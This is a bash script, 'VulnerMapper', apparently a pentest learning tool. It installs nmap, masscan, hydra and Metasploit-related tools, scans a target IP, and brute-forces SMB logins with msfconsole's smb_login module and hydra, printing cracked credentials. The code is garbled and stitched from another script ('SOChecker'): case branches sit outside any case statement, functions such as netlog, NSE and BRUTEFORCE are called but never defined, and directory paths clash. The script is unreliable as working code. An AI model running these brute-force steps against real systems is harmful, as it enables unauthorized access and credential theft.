#!/bin/bash

###########################
### VULNERMAPPER FUNCTIONS
###########################

# INSTALL(): automatically installs relevant applications and creates relevant directories
# CONSOLE(): collects user input for session name and network range, creates new directory, and executes the subsequent core functions
# SCAN(): uses nmap and masscan to scan for ports and services, and saves information into directory
# NSE(): uses nmap scripting engine to extract more information about services based on scan results
# SEARCHSPLOIT(): uses searchsploit to find potential vulnerabilities based on service results
# BRUTEFORCE(): uses hydra and medusa to find weak passwords used in the network's login services, based on the vulnerability results
# LOG(): shows the user the collated results of SCAN(), NSE(), SEARCHSPLOIT(), and BRUTEFORCE() after their execution 

#####################
### INSTALL FUNCTION
#####################

### DEFINITION

function INSTALL()
{
	### START
	# let the user know that VulnerMapper is starting
	echo " "
	echo "[*] VulnerMapper is starting..."
	echo " "
	echo "[*] Installing and updating applications on your local computer..."
	echo " "
	echo "[*] Creating new directory: ~/VulnerMapper..."
	echo " "
	
	### APT UPDATE
	# update APT packages
	sudo apt-get update
	sudo apt-get upgrade
	sudo apt-get dist-upgrade
	
	### DIRECTORY
	# create a directory to contain output files later
	cd ~
	mkdir VulnerMapper
	cd ~/VulnerMapper
	echo "[+] Directory created: ~/VulnerMapper"
	echo " "
	
  	### FIGLET INSTALLATION
	# install figlet for aesthetic purposes
	# create a directory for downloading the figlet resources
	mkdir figrc
	cd ~/VulnerMapper/figrc
	sudo apt-get -y install figlet
	# install cybermedium figlet font; credits: http://www.figlet.org
	wget http://www.jave.de/figlet/fonts/details/cybermedium.flf
	cd ~/VulnerMapper
	
	### CORE APPLICATIONS INSTALLATION
	# install relevant applications
	sudo apt-get -y install nmap
	sudo apt-get -y install masscan
	sudo apt -y install exploitdb
	sudo apt-get -y install hydra
	sudo apt-get -y install medusa
	
	### END
	# let the user know applications are installed
	echo " "
	echo "[+] Applications installed and updated."
	echo "	"
}

### EXECUTION
# call the INSTALL function
INSTALL

#################
### LOG FUNCTION
#################

### DEFINITION
function LOG()
{ 
	### NMAP LOGGING
	# test if nmapoutput.txt exists
	if [ -f ~/SOChecker/nmapoutput.txt ]
	then
		# include date, time, IPs, attack type and used arguments in log
		DateTime="$(date +%F)_$(date +%X | awk '{print $1}')"
		AttackType="NmapPortScan"
		Arg="[sudo nmap -Pn $IP]"
		NumOpenPorts="$(cat nmapoutput.txt | grep open | wc -l)"
		# append filtered data into netlog.log
		echo "$DateTime $IP $AttackType $Arg [$NumOpenPorts Open Ports"] >> netlog.log
	fi
	
	### MASSCAN LOGGING
	# test if masscanoutput.txt exists
	if [ -f ~/SOChecker/masscanoutput.txt ]
	then
		# include date, time, IPs, attack type and used arguments in log
		DateTime="$(date +%F)_$(date +%X | awk '{print $1}')"
		AttackType="MasscanPortScan"
		Arg="[sudo masscan $IP -p'$Ports']"
		NumOpenPorts="$(cat masscanoutput.txt | grep open | wc -l)"
		# append filtered data into netlog.log
		echo "$DateTime $IP $AttackType $Arg [$NumOpenPorts Open Ports"] >> netlog.log
	fi
	
	# MSF LOGGING
	# test if msfoutput.txt exists
	if [ -f ~/SOChecker/msfoutput.txt ]
	then
		# include date, time, IPs, attack type and used arguments in log
		DateTime="$(date +%F)_$(date +%X | awk '{print $1}')"
		AttackType="MSFSMBBruteForceAttack"
		Arg="[sudo msfconsole -r msfscript.rc]"
		NumCrackedUsers="$(cat msfoutput.txt | grep Success: | wc -l)"
		# append filtered data into netlog.log
		echo "$DateTime $IP $AttackType $Arg [$NumCrackedUsers Cracked Users"] >> netlog.log
	fi
	
	### HYDRA LOGGING
	# test if hydraoutput.txt exists
	if [ -f ~/SOChecker/hydraoutput.txt ]
	then
		# include date, time, IPs, attack type and used arguments in log
		DateTime="$(date +%F)_$(date +%X | awk '{print $1}')"
		AttackType="HydraSMBBruteForceAttack"
		Arg="[sudo hydra -L $UserList -P $PassList $IP smb -vV]"
		NumCrackedUsers="$(cat hydraoutput.txt | grep host: | wc -l)"
		# append filtered data into netlog.log
		echo "$DateTime $IP $AttackType $Arg [$NumCrackedUsers Cracked Users]" >> netlog.log
	fi
}

##################
### SCAN FUNCTION
##################

### DEFINITION
function SCAN()
{
	# NMAP PORT SCAN 
A) echo " "
echo "NMAP PORT SCAN"
echo " "
echo "Enter IP Address of Target Host:"
read IP
echo " "
# navigate to SOChecker directory
cd ~/SOChecker
# execute scan with -Pn flag to avoid firewall 
sudo nmap -Pn "$IP" > nmapoutput.txt
# call the netlog function to append elements of nmapoutput.txt into netlog.log
netlog
# let user know about the number and details of open ports 
echo " "
echo "$(cat nmapoutput.txt | grep open | wc -l) OPEN PORTS:"
echo "$(cat nmapoutput.txt | grep open | awk '{print $1}')"
echo " "
# remove the nmapoutput.txt file after use
rm nmapoutput.txt
# let user know that the scan is done
echo " "
echo "Nmap Port Scan has been executed and logged at ~/SOChecker/netlog.log."
echo " "
;;
}


# B. MASSCAN PORT SCAN
B) echo " "
echo "MASSCAN PORT SCAN"
echo " "
echo "Enter IP Address of Target Host:"
read IP
echo " "
echo "Enter Port Numbers: (e.g. 445,80)"
read Ports
echo " "
# navigate to SOChecker directory
cd ~/SOChecker
# execute scan with specified ports 
sudo masscan "$IP" -p"$Ports" > masscanoutput.txt
# call the netlog function to append elements of masscanoutput.txt into netlog.log
netlog
# let user know about the number and details of open ports 
echo " "
echo "$(cat masscanoutput.txt | grep open | wc -l) OPEN PORTS:"
echo "$(cat masscanoutput.txt | grep open | awk '{print $4}')"
echo " "
# remove the masscanpoutput.txt file after use
rm masscanoutput.txt
# let user know that the scan is done
echo " "
echo "Masscan Port Scan has been executed and logged at ~/SOChecker/netlog.log."
echo " "
;;

# C. MSF SMB BRUTE-FORCE ATTACK
C) echo " "
echo "MSF SMB BRUTE-FORCE ATTACK"
echo " "
echo "Enter IP Address of Target Host:"
read IP
echo " "
echo "Enter file path of user list:"
read UserList
echo " "
echo "Enter file path of password list:"
read PassList
echo " "
# navigate to SOChecker directory
cd ~/SOChecker
# create a .rc file to act as a script for msf console
# inject then apend msfconsole commands
echo "use auxiliary/scanner/smb/smb_login" > msfscript.rc
echo "set rhosts $IP" >> msfscript.rc
echo "set user_file $UserList" >> msfscript.rc
echo "set pass_file $PassList" >> msfscript.rc
echo "run" >> msfscript.rc
echo "exit" >> msfscript.rc
# execute attack utilising the .rc script 
sudo msfconsole -r msfscript.rc -o msfoutput.txt
# call the netlog function to append elements of msfoutput.txt into netlog.log
netlog
# let user know about the number and details of cracked users
echo " "
echo "$(cat msfoutput.txt | grep Success: | wc -l) CRACKED USERS: (Format: '.\<username>:<password>')"
echo "$(cat msfoutput.txt | grep Success: | awk '{print $7}')"
echo " "
# remove the msfscript.rc and msfoutput.txt files after use
sudo chmod 777 msfscript.rc
sudo rm msfscript.rc
rm msfoutput.txt
# let user know that the attack is done
echo " "
echo "MSF SMB Brute-Force Attack has been executed and logged at ~/SOChecker/netlog.log."
echo " "
;;

# D. HYDRA SMB BRUTE-FORCE ATTACK
D) echo " "
echo "HYDRA SMB BRUTE-FORCE ATTACK"
echo " "
echo "Enter IP Address of Target Host:"
read IP
echo " "
echo "Enter file path of user list:"
read UserList
echo " "
echo "Enter file path of password list:"
read PassList
echo " "
# navigate to SOChecker directory
cd ~/SOChecker
# execute attack 
sudo hydra -L "$UserList" -P "$PassList" "$IP" smb -vV > hydraoutput.txt
# call the netlog function to append elements of hydraoutput.txt into netlog.log
netlog
# let user know about the number and details of cracked users
echo " "
echo "$(cat hydraoutput.txt | grep host: | wc -l) CRACKED USERS: (Format: <username> <password>)"
echo "$(cat hydraoutput.txt | grep host: | awk '{print $5 $7}')"
echo " "
# remove the hydraoutput.txt files after use
rm hydraoutput.txt
# let user know that the attack is done
echo " "
echo "Hydra SMB Brute-Force Attack has been executed and logged at ~/SOChecker/netlog.log."
echo " "
;;

# E. EXIT 
E) echo " "
echo "Exiting SOCHecker..."
echo " "
exit
;;

esac

###################
# CONSOLE FUNCTION
###################

### DEFINITION

function CONSOLE()
{
	### START
	# display figlet for aesthetics, with short description of program
	figlet -c -f ~/VulnerMapper/figrc/cybermedium.flf -t "VULNERMAPPER"
	echo " "
	echo "[*] This program is for mapping vulnerabilities in a local network. Please use for penetration testing and education purposes only."
	echo " "
	echo "[!] Press Ctrl-C to exit."
	echo " "
	
	### SESSION NAME INPUT
	read -p "[!] Enter Session Name: " session
	cd ~/VulnerMapper
	mkdir $session
	cd ~/VulnerMapper/$session
	echo " "
	echo "[+] Directory created: ~/VulnerMapper/$session"
	echo " "
	
	### NETWORK RANGE INPUT
	read -p "[!] Enter Network Range: " range
	cd ~/VulnerMapper/$session
	mkdir $range
	cd ~/VulnerMapper/$session/$range
	echo " "
	echo "[+] Directory created: ~/VulnerMapper/$session/$range"
	echo " "
	
	### CORE EXECUTION
	# call the core functions to map the specified local network range
	SCAN
	NSE
	SEARCHSPLOIT
	BRUTEFORCE
	LOG
	
	### END
	# force a pause before triggering the loop to allow the user to focus on the results
	echo " "
	echo "[!] Press any key to return to the console."
}

### EXECUTION
# call the CONSOLE function through while-true loop to return user to the console after every execution
while true 
do
CONSOLE
done
